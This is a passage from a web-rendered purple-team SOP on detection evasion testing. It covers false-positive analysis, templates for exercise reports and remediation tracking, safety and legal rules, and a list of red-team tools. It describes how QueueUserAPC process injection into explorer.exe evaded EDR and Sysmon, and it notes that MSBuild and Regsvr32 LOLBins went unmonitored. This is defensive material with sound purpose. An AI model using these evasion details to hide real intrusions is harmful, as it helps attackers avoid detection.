search for known malicious patterns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">2.</span><span class="token plain"> Implement UBA baseline for PowerShell usage per user/role</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">3.</span><span class="token plain"> Alert on PowerShell from unusual parent processes (Word, Excel, etc.)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="false-positive-analysis">False Positive Analysis<a href="#false-positive-analysis" class="hash-link" aria-label="Direct link to False Positive Analysis" title="Direct link to False Positive Analysis" translate="no">​</a></h3>
<p><strong>Document Benign Activity Triggering Alerts:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">False Positive Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Alert: &quot;Credential Access via Registry&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Trigger: Legitimate backup software reading SAM hive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Root Cause: Rule too broad (any registry access to SAM/SECURITY)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Recommendation: Add exception for backup process (signed binary, expected schedule)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="evasion-success-tracking">Evasion Success Tracking<a href="#evasion-success-tracking" class="hash-link" aria-label="Direct link to Evasion Success Tracking" title="Direct link to Evasion Success Tracking" translate="no">​</a></h3>
<p><strong>If Technique Evaded Detection:</strong></p>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> Evasion Success: Process Injection via QueueUserAPC</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Technique</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: T1055.004 (Asynchronous Procedure Call)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Tool</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: Custom injector</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Why Detection Failed</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">1.</span><span class="token plain"> EDR heuristics did not flag QueueUserAPC API call</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">2.</span><span class="token plain"> Sysmon Event ID 8 (CreateRemoteThread) not triggered (different injection method)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">3.</span><span class="token plain"> No memory scanning at time of injection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Exploit Conditions</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Unsigned injector binary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Injection into legitimate process (explorer.exe)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> No network activity post-injection (stayed dormant)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Remediation</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Implement ETW (Event Tracing for Windows) monitoring for thread creation APIs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Add memory scanning on suspicious process access events</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Deploy YARA rules to detect injection frameworks</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="7-reporting--improvement">7. Reporting &amp; Improvement<a href="#7-reporting--improvement" class="hash-link" aria-label="Direct link to 7. Reporting &amp; Improvement" title="Direct link to 7. Reporting &amp; Improvement" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="executive-summary-template">Executive Summary Template<a href="#executive-summary-template" class="hash-link" aria-label="Direct link to Executive Summary Template" title="Direct link to Executive Summary Template" translate="no">​</a></h3>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token title important punctuation" style="color:#393A34">#</span><span class="token title important"> Purple Team Exercise Report</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Date</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: 2025-10-05</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Duration</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: 4 hours</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Participants</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: Red Team (3), Blue Team (5), SOC (2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> Objectives</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Validate detection coverage for credential access and lateral movement techniques used by APT29.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> Summary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Techniques Tested</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: 12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Techniques Detected</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: 9 (75%)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">High-Fidelity Alerts</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: 7 (78%)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">False Positives</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Critical Gaps</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: 3 (privilege escalation, evasion, persistence)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> Key Findings</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">✅ </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Strengths</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> PowerShell logging and EDR provide excellent coverage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Lateral movement via RDP detected consistently</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Credential dumping from LSASS detected in &lt; 30 seconds</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">❌ </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Weaknesses</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Process injection techniques evaded EDR behavioral detection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> LOLBins (MSBuild, Regsvr32) not monitored</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> C2 beaconing patterns not correlated in SIEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> Recommendations</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">1.</span><span class="token plain"> </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Immediate</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: Deploy Sysmon config update for process injection monitoring</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">2.</span><span class="token plain"> </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Short-term</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain"> (30 days): Implement LOLBin detection rules (Sigma/Splunk)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">3.</span><span class="token plain"> </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Long-term</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain"> (90 days): Enhance C2 detection with JA3 fingerprinting and beaconing analysis</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="improvement-tracking">Improvement Tracking<a href="#improvement-tracking" class="hash-link" aria-label="Direct link to Improvement Tracking" title="Direct link to Improvement Tracking" translate="no">​</a></h3>
<p><strong>Action Items with Owners:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">| Priority | Finding | Recommended Action | Owner | Due Date | Status |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|----------|---------|-------------------|-------|----------|--------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| P1 | Process injection not detected | Deploy Sysmon config v15 | SecOps | 2025-10-12 | In Progress |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| P1 | MSBuild execution not alerted | Create SIEM rule for LOLBins | SOC Lead | 2025-10-15 | Pending |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| P2 | C2 beaconing not correlated | Implement JA3/JA3S monitoring | NetSec | 2025-11-01 | Planning |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| P3 | UBA not detecting anomalous PowerShell | Tune UBA baseline for PowerShell | SIEM Admin | 2025-12-01 | Backlog |</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="8-safety--legal">8. Safety &amp; Legal<a href="#8-safety--legal" class="hash-link" aria-label="Direct link to 8. Safety &amp; Legal" title="Direct link to 8. Safety &amp; Legal" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="safety-protocols">Safety Protocols<a href="#safety-protocols" class="hash-link" aria-label="Direct link to Safety Protocols" title="Direct link to Safety Protocols" translate="no">​</a></h3>
<p>❌ <strong>Never</strong>:</p>
<ul>
<li class="">Test in production without isolated telemetry</li>
<li class="">Use real malware or exploit kits</li>
<li class="">Exfiltrate actual sensitive data</li>
<li class="">Perform denial of service attacks</li>
<li class="">Pivot beyond authorized scope</li>
<li class="">Test without SOC coordination</li>
</ul>
<p>✅ <strong>Always</strong>:</p>
<ul>
<li class="">Use benign simulators (Atomic Red Team, Caldera)</li>
<li class="">Maintain rollback capability (snapshots)</li>
<li class="">Coordinate timing with SOC</li>
<li class="">Document every action with timestamps</li>
<li class="">Verify isolation before execution</li>
<li class="">Stop immediately on unexpected behavior</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="legal-considerations">Legal Considerations<a href="#legal-considerations" class="hash-link" aria-label="Direct link to Legal Considerations" title="Direct link to Legal Considerations" translate="no">​</a></h3>
<p><strong>Authorization Documentation:</strong></p>
<ul>
<li class="">Signed approval from CISO/CIO</li>
<li class="">Scope clearly defined and acknowledged</li>
<li class="">Indemnification (if external red team involved)</li>
<li class="">NDA/confidentiality agreements</li>
<li class="">Safe harbor clause for good-faith testing</li>
</ul>
<p><strong>Compliance:</strong></p>
<ul>
<li class="">No violations of Computer Fraud and Abuse Act (CFAA)</li>
<li class="">Respect organizational acceptable use policies</li>
<li class="">No testing of third-party services without consent</li>
<li class="">Proper handling of any discovered vulnerabilities</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="9-tools-reference">9. Tools Reference<a href="#9-tools-reference" class="hash-link" aria-label="Direct link to 9. Tools Reference" title="Direct link to 9. Tools Reference" translate="no">​</a></h2>
<table><thead><tr><th>Tool</th><th>Purpose</th><th>Link</th></tr></thead><tbody><tr><td><strong>Red Team Frameworks</strong></td><td></td><td></td></tr><tr><td>Atomic Red Team</td><td>Technique-specific tests</td><td><a href="https://github.com/redcanaryco/atomic-red-team" target="_blank" rel="noopener noreferrer" class="">github.com/redcanaryco/atomic-red-team</a></td></tr><tr><td>MITRE Caldera</td><td>Automated adversary emulation</td><td><a href="https://github.com/mitre/caldera" target="_blank" rel="noopener noreferrer" class="">github.com/mitre/caldera</a></td></tr><tr><td>Infection Monkey</td><td>Lateral movement testing</td><td><a href="https://www.guardicore.com/infectionmonkey/" target="_blank" rel="noopener noreferrer" class="">guardicore.com/infectionmonkey</a></td></tr><tr><td>Cobalt Strike</td><td>C2 framework (commercial)</td><td><a href="https://www.cobaltstrike.com" target="_blank" rel="noopener noreferrer" class="">cobaltstrike.com</a></td></tr><tr><td>Metasploit</td><td>Exploitation framework</td><td><a href="https://www.metasploit.com" target="_blank" rel="noopener noreferrer" class="">metasploit.com</a></td></tr><tr><td><strong>Detection Tools</strong></td><td></td><td></td></tr><tr><td>Sysmon</td><td>Windows event logging</td><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noopener noreferrer" class="">docs.microsoft.com/sysinternals</a></td></tr><tr><td>Sigma</td><td>Generic detection rules</td><td><a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noopener noreferrer" class="">github.com/SigmaHQ/sigma</a></td></tr><tr><td>YARA</td><td>Pattern matching</td><td><a href="https://virustotal.github.io/yara/" target="_blank" rel="noopener noreferrer" class="">virustotal.github.io/yara</a></td></tr><tr><td><strong>Analysis</strong></td><td></td><td></td></tr><tr><td>ATT&amp;CK Navigator</td><td>Technique coverage mapping</td><td><a href="https://mitre-attack.github.io/attack-navigator/" target="_blank" rel="noopener noreferrer" class="">mitre-attack.github.io/attack-navigator</a></td></tr><tr><td>DeTT&amp;CT</td><td>Detection coverage scoring</td><td><a href="https://github.com/rabobank-cdc/DeTTECT" target="_blank" rel="noopener noreferrer" class="">github.com/rabobank-cdc/DeTTECT</a></td></tr></tbody></table>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="10-common-pitfalls">10. Common Pitfalls<a href="#10-common-pitfalls" class="hash-link" aria-label="Direct link to 10. Common Pitfalls" title="Direct link to 10. Common Pitfalls" translate="no">​</a></h2>
<ul>
<li class="">❌ Testing without proper authorization (legal risk)</li>
<li class="">❌ Using production systems (availability/integrity risk)</li>
<li class="">❌ Not coordinating with SOC (alert fatigue, missed detections)</li>
<li class="">❌ Forgetting cleanup procedures (persistence artifacts remain)</li>
<li class="">❌ Not documenting methodology (can&#x27;t reproduce results)</li>
<li class="">❌ Testing too many techniques at once (difficult to correlate)</li>
<li class="">❌ Ignoring false positives (alert tuning opportunity missed)</li>
<li class="">❌ Not retesting after remediation (validate fixes)</li>
<li class="">❌ Poor communication (red/blue team siloed)</li>
<li class="">❌ Treating this as red team vs. blue team (collaborative improvement, not competition)</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="related-sops">Related SOPs<a href="#related-sops" class="hash-link" aria-label="Direct link to Related SOPs" title="Direct link to Related SOPs" translate="no">​</a></h2>
<p><strong>Analysis:</strong></p>
<ul>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-reverse-engineering">Reverse Engineering</a> - Analyzing evasion techniques in binaries</li>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-cryptography-analysis">Cryptography Analysis</a> - Encryption-based evasion methods</li>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-malware-analysis">Malware Analysis</a> - Malware evasion technique analysis</li>
</ul>
<p><strong>Pentesting &amp; Security:</strong></p>
<ul>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-ad-pentest">Active Directory Pentesting</a> - AD-specific evasion techniques</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-linux-pentest">Linux Pentesting</a> - Linux evasion and anti-forensics</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-web-application-security">Web Application Security</a> - WAF and IDS/IPS bypass</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-mobile-security">Mobile Security</a> - Mobile platform evasion techniques</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-vulnerability-research">Vulnerability Research</a> - Testing exploit detection</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-bug-bounty">Bug Bounty Hunting</a> - Understanding detection evasion for responsible disclosure</li>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-forensics-investigation">Forensics Investigation</a> - Testing anti-forensics effectiveness</li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-tags-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/sop">sop</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/detection">detection</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/evasion">evasion</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/purple-team">purple-team</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/red-team">red-team</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/blue-team">blue-team</a></li></ul></div></div><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/gl0bal01/intel-codex/tree/main/intel-codex/Security/Pentesting/sop-detection-evasion-testing.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/intel-codex/Security/Pentesting/sop-bug-bounty"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Bug Bounty Methodology SOP</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Firmware Reverse Engineering</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#table-of-contents" class="table-of-contents__link toc-highlight">Table of Contents</a></li><li><a href="#1-pre-engagement--authorization" class="table-of-contents__link toc-highlight">1. Pre-Engagement &amp; Authorization</a><ul><li><a href="#authorization-requirements" class="table-of-contents__link toc-highlight">Authorization Requirements</a></li><li><a href="#lab-environment-requirements" class="table-of-contents__link toc-highlight">Lab Environment Requirements</a></li></ul></li><li><a href="#2-threat-intelligence--hypothesis-development" class="table-of-contents__link toc-highlight">2. Threat Intelligence &amp; Hypothesis Development</a><ul><li><a href="#threat-modeling" class="table-of-contents__link toc-highlight">Threat Modeling</a></li><li><a href="#hypothesis-formulation" class="table-of-contents__link toc-highlight">Hypothesis Formulation</a></li></ul></li><li><a href="#3-test-planning--scenario-design" class="table-of-contents__link toc-highlight">3. Test Planning &amp; Scenario Design</a><ul><li><a href="#control-coverage-matrix" class="table-of-contents__link toc-highlight">Control Coverage Matrix</a></li><li><a href="#success-metrics" class="table-of-contents__link toc-highlight">Success Metrics</a></li><li><a href="#test-scenarios" class="table-of-contents__link toc-highlight">Test Scenarios</a></li></ul></li><li><a href="#4-adversary-simulation-tools--techniques" class="table-of-contents__link toc-highlight">4. Adversary Simulation Tools &amp; Techniques</a><ul><li><a href="#red-team-testing-frameworks" class="table-of-contents__link toc-highlight">Red Team Testing Frameworks</a></li><li><a href="#specific-evasion-techniques-to-test" class="table-of-contents__link toc-highlight">Specific Evasion Techniques to Test</a></li></ul></li><li><a href="#5-execution--monitoring" class="table-of-contents__link toc-highlight">5. Execution &amp; Monitoring</a><ul><li><a href="#execution-protocol" class="table-of-contents__link toc-highlight">Execution Protocol</a></li><li><a href="#data-collection" class="table-of-contents__link toc-highlight">Data Collection</a></li></ul></li><li><a href="#6-analysis--gap-identification" class="table-of-contents__link toc-highlight">6. Analysis &amp; Gap Identification</a><ul><li><a href="#detection-coverage-analysis" class="table-of-contents__link toc-highlight">Detection Coverage Analysis</a></li><li><a href="#false-positive-analysis" class="table-of-contents__link toc-highlight">False Positive Analysis</a></li><li><a href="#evasion-success-tracking" class="table-of-contents__link toc-highlight">Evasion Success Tracking</a></li></ul></li><li><a href="#7-reporting--improvement" class="table-of-contents__link toc-highlight">7. Reporting &amp; Improvement</a><ul><li><a href="#executive-summary-template" class="table-of-contents__link toc-highlight">Executive Summary Template</a></li><li><a href="#improvement-tracking" class="table-of-contents__link toc-highlight">Improvement Tracking</a></li></ul></li><li><a href="#8-safety--legal" class="table-of-contents__link toc-highlight">8. Safety &amp; Legal</a><ul><li><a href="#safety-protocols" class="table-of-contents__link toc-highlight">Safety Protocols</a></li><li><a href="#legal-considerations" class="table-of-contents__link toc-highlight">Legal Considerations</a></li></ul></li><li><a href="#9-tools-reference" class="table-of-contents__link toc-highlight">9. Tools Reference</a></li><li><a href="#10-common-pitfalls" class="table-of-contents__link toc-highlight">10. Common Pitfalls</a></li><li><a href="#related-sops" class="table-of-contents__link toc-highlight">Related SOPs</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Intel Codex</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="Intel Codex overview page" href="/intel-codex">Overview</a></li><li class="footer__item"><a href="https://github.com/gl0bal01/intel-codex" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Download the Intel Codex Obsidian vault">Download Vault<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">OSINT Investigations</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="OSINT investigation index" href="/intel-codex/Investigations/Investigations-Index">Investigation Index</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Investigation techniques and methodologies" href="/intel-codex/Investigations/Techniques/Techniques-Index">Investigation Techniques</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Platform-specific investigation guides" href="/intel-codex/Investigations/Platforms/Platforms-Index">Platform Guides</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Security Operations</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="Security analysis resources and guides" href="/intel-codex/Security/Analysis/Analysis-Index">Security Analysis</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Penetration testing methodologies and tools" href="/intel-codex/Security/Pentesting/Pentesting-Index">Penetration Testing</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Malware analysis procedures" href="/intel-codex/Security/Analysis/sop-malware-analysis">Malware Analysis</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Reverse engineering techniques" href="/intel-codex/Security/Analysis/sop-reverse-engineering">Reverse Engineering</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Digital forensics investigation procedures" href="/intel-codex/Security/Analysis/sop-forensics-investigation">Digital Forensics (DFIR)</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Resources</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="OSINT foundations and resources" href="/osint">OSINT Foundations</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Cybersecurity resources and guides" href="/cyber">Cybersecurity</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Artificial intelligence resources" href="/ai">AI Resources</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Technical cheatsheets and quick references" href="/cheatsheets">Cheatsheets</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Security and technology news feeds" href="/news">News Feeds</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Visit our blog" href="/blog">Blog</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="CTF platforms and training resources" href="/blog/ctf-platforms-training">Play &amp; Learn</a></li><li class="footer__item"><a href="https://github.com/gl0bal01/" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Visit gl0bal01 on GitHub">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://discord.gg/T5tc9Rq8DV" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Join gl0bal01 Discord community">Discord<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://start.me/u/gl0bal01" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Visit gl0bal01 Start.me page">Start.me<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 gl0bal01. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>